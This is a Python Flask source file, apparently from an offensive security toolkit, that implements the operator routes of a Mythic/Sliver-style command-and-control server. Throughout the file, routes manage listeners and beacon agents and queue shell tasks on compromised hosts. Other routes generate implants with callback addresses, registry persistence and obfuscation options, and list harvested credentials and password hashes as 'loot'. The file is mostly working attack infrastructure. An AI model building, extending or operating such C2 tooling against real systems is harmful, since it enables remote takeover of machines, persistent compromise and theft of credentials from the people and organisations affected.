"""
Advanced C2 (Command & Control) Routes
Mythic/Sliver-style modular C2 endpoints.
"""
from flask import Blueprint, render_template, request, jsonify, redirect, session
from datetime import datetime

from cybermodules.c2_framework import get_c2_server, Agent, Task, Listener
from cybermodules.c2_implant import C2ImplantGenerator, ImplantConfig, generate_c2_from_session

c2_bp = Blueprint("c2", __name__)


# ============== Dashboard & UI ==============

@c2_bp.route("/c2")
def c2_dashboard():
    """C2 Dashboard - Main control panel."""
    if not session.get("logged_in"):
        return redirect("/login")
    
    c2 = get_c2_server()
    agents = c2.list_agents()
    listeners = c2.list_listeners()
    tasks = c2.list_tasks()[:20]  # Last 20 tasks
    
    return render_template("c2_implant.html",
                          agents=[a.to_dict() for a in agents],
                          listeners=[l.to_dict() for l in listeners],
                          recent_tasks=[t.to_dict() for t in tasks])


# ============== Listener Management ==============

@c2_bp.route("/c2/listeners")
def list_listeners():
    """List all listeners."""
    if not session.get("logged_in"):
        return jsonify({"error": "login_required"}), 401
    
    c2 = get_c2_server()
    listeners = c2.list_listeners()
    return jsonify({
        "success": True,
        "listeners": [l.to_dict() for l in listeners]
    })


@c2_bp.route("/c2/listeners", methods=["POST"])
def create_listener():
    """Create a new listener."""
    if not session.get("logged_in"):
        return jsonify({"error": "login_required"}), 401
    
    data = request.get_json()
    c2 = get_c2_server()
    
    try:
        listener = c2.create_listener(
            name=data.get("name", "http-listener"),
            listener_type=data.get("type", "http"),
            host=data.get("host", "0.0.0.0"),
            port=int(data.get("port", 8443)),
            options=data.get("options", {})
        )
        return jsonify({
            "success": True,
            "listener": listener.to_dict()
        }), 201
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 400


@c2_bp.route("/c2/listeners/<listener_id>", methods=["DELETE"])
def delete_listener(listener_id):
    """Delete a listener."""
    if not session.get("logged_in"):
        return jsonify({"error": "login_required"}), 401
    
    c2 = get_c2_server()
    c2.delete_listener(listener_id)
    return jsonify({"success": True})


@c2_bp.route("/c2/listeners/<listener_id>/start", methods=["POST"])
def start_listener(listener_id):
    """Start a listener."""
    if not session.get("logged_in"):
        return jsonify({"error": "login_required"}), 401
    
    c2 = get_c2_server()
    success = c2.start_listener(listener_id)
    return jsonify({"success": success})


@c2_bp.route("/c2/listeners/<listener_id>/stop", methods=["POST"])
def stop_listener(listener_id):
    """Stop a listener."""
    if not session.get("logged_in"):
        return jsonify({"error": "login_required"}), 401
    
    c2 = get_c2_server()
    success = c2.stop_listener(listener_id)
    return jsonify({"success": success})


# ============== Agent Management ==============

@c2_bp.route("/c2/agents")
def list_agents():
    """List all agents."""
    if not session.get("logged_in"):
        return jsonify({"error": "login_required"}), 401
    
    c2 = get_c2_server()
    status = request.args.get("status")
    agents = c2.list_agents(status)
    return jsonify({
        "success": True,
        "agents": [a.to_dict() for a in agents]
    })


@c2_bp.route("/c2/agents/<agent_id>")
def get_agent(agent_id):
    """Get agent details."""
    if not session.get("logged_in"):
        return jsonify({"error": "login_required"}), 401
    
    c2 = get_c2_server()
    agent = c2.get_agent(agent_id)
    
    if not agent:
        return jsonify({"error": "Agent not found"}), 404
    
    # Get agent's tasks
    tasks = c2.list_tasks(agent_id)
    
    return jsonify({
        "success": True,
        "agent": agent.to_dict(),
        "tasks": [t.to_dict() for t in tasks]
    })


@c2_bp.route("/c2/agents/<agent_id>/task", methods=["POST"])
def create_agent_task(agent_id):
    """Send a task to an agent."""
    if not session.get("logged_in"):
        return jsonify({"error": "login_required"}), 401
    
    c2 = get_c2_server()
    data = request.get_json()
    
    agent = c2.get_agent(agent_id)
    if not agent:
        return jsonify({"error": "Agent not found"}), 404
    
    task = c2.create_task(
        agent_id=agent_id,
        command=data.get("command", "shell"),
        args=data.get("args", [])
    )
    
    return jsonify({
        "success": True,
        "task": task.to_dict()
    }), 201


@c2_bp.route("/c2/agents/<agent_id>/kill", methods=["POST"])
def kill_agent(agent_id):
    """Kill an agent."""
    if not session.get("logged_in"):
        return jsonify({"error": "login_required"}), 401
    
    c2 = get_c2_server()
    success = c2.kill_agent(agent_id)
    return jsonify({"success": success})


# ============== Beacon Endpoints (Agent Callbacks) ==============

@c2_bp.route("/c2/beacon/register", methods=["POST"])
def beacon_register():
    """
    Agent registration endpoint.
    Called when a new implant checks in for the first time.
    """
    data = request.get_json()
    c2 = get_c2_server()
    
    try:
        agent = c2.register_agent(
            hostname=data.get("hostname", "unknown"),
            username=data.get("username", "unknown"),
            os_info=data.get("os", "unknown"),
            arch=data.get("arch", "unknown"),
            pid=int(data.get("pid", 0)),
            listener_id=data.get("listener_id", "default"),
            ip_address=request.remote_addr,
            integrity=data.get("integrity", "medium")
        )
        
        return jsonify({
            "success": True,
            "agent_id": agent.agent_id,
            "sleep": agent.sleep_interval,
            "jitter": agent.jitter
        })
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 400


# NOTE: Legacy beacon endpoints - replaced by beacon_bp in c2_beacon.py
# Use /c2/beacon/* endpoints from beacon_bp for real beacon management

@c2_bp.route("/c2/legacy/beacon/checkin", methods=["POST"])
def legacy_beacon_checkin():
    """
    Legacy Agent check-in endpoint.
    Returns pending tasks for the agent.
    """
    data = request.get_json()
    agent_id = data.get("agent_id")
    
    if not agent_id:
        return jsonify({"error": "agent_id required"}), 400
    
    c2 = get_c2_server()
    tasks = c2.agent_checkin(agent_id)
    
    return jsonify({
        "success": True,
        "tasks": [t.to_dict() for t in tasks]
    })


@c2_bp.route("/c2/legacy/beacon/result", methods=["POST"])
def legacy_beacon_result():
    """
    Agent result submission endpoint.
    Called when an agent completes a task.
    """
    data = request.get_json()
    
    agent_id = data.get("agent_id")
    task_id = data.get("task_id")
    output = data.get("output", "")
    status = data.get("status", "completed")
    error = data.get("error", "")
    
    if not agent_id or not task_id:
        return jsonify({"error": "agent_id and task_id required"}), 400
    
    c2 = get_c2_server()
    c2.task_result(agent_id, task_id, output, status, error)
    
    return jsonify({"success": True})


# ============== Task Management ==============

@c2_bp.route("/c2/tasks")
def list_tasks():
    """List all tasks."""
    if not session.get("logged_in"):
        return jsonify({"error": "login_required"}), 401
    
    c2 = get_c2_server()
    agent_id = request.args.get("agent_id")
    tasks = c2.list_tasks(agent_id)
    
    return jsonify({
        "success": True,
        "tasks": [t.to_dict() for t in tasks]
    })


@c2_bp.route("/c2/tasks/<task_id>")
def get_task(task_id):
    """Get task details."""
    if not session.get("logged_in"):
        return jsonify({"error": "login_required"}), 401
    
    c2 = get_c2_server()
    task = c2.get_task(task_id)
    
    if not task:
        return jsonify({"error": "Task not found"}), 404
    
    return jsonify({
        "success": True,
        "task": task.to_dict()
    })


@c2_bp.route("/c2/tasks/<task_id>/cancel", methods=["POST"])
def cancel_task(task_id):
    """Cancel a pending task."""
    if not session.get("logged_in"):
        return jsonify({"error": "login_required"}), 401
    
    c2 = get_c2_server()
    success = c2.cancel_task(task_id)
    return jsonify({"success": success})


# ============== Payload Generation ==============

@c2_bp.route("/c2/payloads/types")
def get_payload_types():
    """Get available payload types."""
    if not session.get("logged_in"):
        return jsonify({"error": "login_required"}), 401
    
    c2 = get_c2_server()
    types = c2.get_payload_types()
    return jsonify({
        "success": True,
        "types": types
    })


@c2_bp.route("/c2/payloads/generate", methods=["POST"])
def generate_payload():
    """Generate an implant payload."""
    if not session.get("logged_in"):
        return jsonify({"error": "login_required"}), 401
    
    data = request.get_json()
    c2 = get_c2_server()
    
    result = c2.generate_payload(
        listener_id=data.get("listener_id"),
        payload_type=data.get("type", "python"),
        options=data.get("options", {})
    )
    
    return jsonify(result)


# ============== Credentials ==============

@c2_bp.route("/c2/credentials")
def list_credentials():
    """List harvested credentials."""
    if not session.get("logged_in"):
        return jsonify({"error": "login_required"}), 401
    
    c2 = get_c2_server()
    creds = c2.list_credentials()
    return jsonify({
        "success": True,
        "credentials": creds
    })


# ============== Legacy Implant Generation (Compatibility) ==============

@c2_bp.route("/c2/generate", methods=["POST"])
def generate_implant():
    """C2 implant üret (Legacy endpoint)."""
    if not session.get("logged_in"):
        return jsonify({"error": "login_required"}), 401
    
    data = request.get_json()
    
    try:
        config = ImplantConfig(
            implant_name=data.get("name", "implant"),
            lhost=data.get("lhost", "192.168.1.100"),
            lport=int(data.get("lport", 4444)),
            interval=int(data.get("interval", 30)),
            jitter=int(data.get("jitter", 5)),
            encryption=data.get("encryption", "aes256"),
            persistence=data.get("persistence", "registry"),
            obfuscate=data.get("obfuscate", False),
            output_path=data.get("output_path", "/tmp")
        )
        
        generator = C2ImplantGenerator()
        result = generator.create_full_implant(config)
        
        return jsonify({
            "success": result.success,
            "source_file": result.source_file,
            "binary_file": result.binary_file,
            "command": result.command,
            "error": result.error
        })
        
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})


@c2_bp.route("/c2/generate-full", methods=["POST"])
def generate_full_implant():
    """Session'dan tam implant üret."""
    if not session.get("logged_in"):
        return jsonify({"error": "login_required"}), 401
    
    data = request.get_json()
    
    try:
        session_data = {
            "name": data.get("name", "implant"),
            "lhost": data.get("lhost", "192.168.1.100"),
            "lport": int(data.get("lport", 4444)),
            "interval": int(data.get("interval", 30)),
            "jitter": int(data.get("jitter", 5)),
            "encryption": data.get("encryption", "aes256"),
            "persistence": data.get("persistence", "registry"),
            "obfuscate": data.get("obfuscate", False)
        }
        
        result = generate_c2_from_session(session_data, "/tmp")
        return jsonify(result)
        
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})


@c2_bp.route("/c2/listener", methods=["POST"])
def create_listener_legacy():
    """C2 listener scripti oluştur (Legacy)."""
    if not session.get("logged_in"):
        return jsonify({"error": "login_required"}), 401
    
    data = request.get_json()
    
    try:
        lhost = data.get("lhost", "0.0.0.0")
        lport = int(data.get("lport", 4444))
        
        generator = C2ImplantGenerator()
        listener_path = generator.save_listener(lhost, lport, "/tmp")
        
        return jsonify({
            "success": True,
            "listener_file": listener_path,
            "command": f"python3 {listener_path}",
            "message": "Listener scripti oluşturuldu"
        })
        
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})


@c2_bp.route("/c2/templates")
def get_templates():
    """Mevcut template'leri listele."""
    if not session.get("logged_in"):
        return jsonify({"error": "login_required"}), 401
    
    try:
        import os
        templates = []
        
        for f in os.listdir("/tmp"):
            if f.endswith(".go") or f.endswith(".exe") or f.startswith("c2_listener"):
                templates.append({
                    "name": f,
                    "path": f"/tmp/{f}",
                    "size": os.path.getsize(f"/tmp/{f}")
                })
        
        return jsonify({
            "success": True,
            "templates": templates
        })
        
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})


# ============== Beacon/Stats/Loot Aliases ==============
# These routes are used by c2_implant.html template

@c2_bp.route("/c2/beacons")
def list_beacons():
    """List beacons (alias for agents)."""
    if not session.get("logged_in"):
        return jsonify({"error": "login_required"}), 401
    try:
        c2 = get_c2_server()
        agents = c2.list_agents()
        return jsonify([{
            "id": a.agent_id,
            "hostname": a.hostname,
            "username": a.username,
            "os": a.os_info,
            "ip": a.ip_address,
            "last_seen": a.last_seen.isoformat() if a.last_seen else None,
            "status": "active" if a.is_active() else "inactive",
            "sleep_interval": getattr(a, 'sleep_interval', 5),
            "tasks_pending": len([t for t in c2.list_tasks() if t.agent_id == a.agent_id and t.status == "pending"])
        } for a in agents])
    except Exception as e:
        return jsonify([])


@c2_bp.route("/c2/beacons/<beacon_id>/task", methods=["POST"])
def beacon_task(beacon_id):
    """Send task to beacon (alias for agent task)."""
    if not session.get("logged_in"):
        return jsonify({"error": "login_required"}), 401
    try:
        c2 = get_c2_server()
        data = request.get_json() or {}
        task = c2.create_task(
            agent_id=beacon_id,
            task_type=data.get("type", "shell"),
            command=data.get("command", ""),
            args=data.get("args", {})
        )
        return jsonify({"success": True, "task_id": task.task_id})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})


@c2_bp.route("/c2/beacons/<beacon_id>/kill", methods=["POST"])
def beacon_kill(beacon_id):
    """Kill beacon (alias for agent kill)."""
    if not session.get("logged_in"):
        return jsonify({"error": "login_required"}), 401
    try:
        c2 = get_c2_server()
        c2.remove_agent(beacon_id)
        return jsonify({"success": True})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})


@c2_bp.route("/c2/stats")
def c2_stats():
    """C2 statistics."""
    if not session.get("logged_in"):
        return jsonify({"error": "login_required"}), 401
    try:
        c2 = get_c2_server()
        agents = c2.list_agents()
        listeners = c2.list_listeners()
        tasks = c2.list_tasks()
        return jsonify({
            "agents": len(agents),
            "active_agents": len([a for a in agents if a.is_active()]),
            "listeners": len(listeners),
            "active_listeners": len([l for l in listeners if l.get("status") == "running"]),
            "tasks": len(tasks),
            "pending_tasks": len([t for t in tasks if t.status == "pending"])
        })
    except Exception:
        return jsonify({
            "agents": 0, "active_agents": 0,
            "listeners": 0, "active_listeners": 0,
            "tasks": 0, "pending_tasks": 0
        })


@c2_bp.route("/c2/loot")
def c2_loot():
    """List collected loot/credentials."""
    if not session.get("logged_in"):
        return jsonify({"error": "login_required"}), 401
    try:
        c2 = get_c2_server()
        creds = c2.list_credentials() if hasattr(c2, 'list_credentials') else []
        return jsonify({
            "credentials": [{
                "type": getattr(c, 'cred_type', 'unknown'),
                "username": getattr(c, 'username', ''),
                "domain": getattr(c, 'domain', ''),
                "source": getattr(c, 'source', ''),
                "hash": getattr(c, 'hash_value', '')
            } for c in creds] if creds else [],
            "files": []
        })
    except Exception:
        return jsonify({"credentials": [], "files": []})
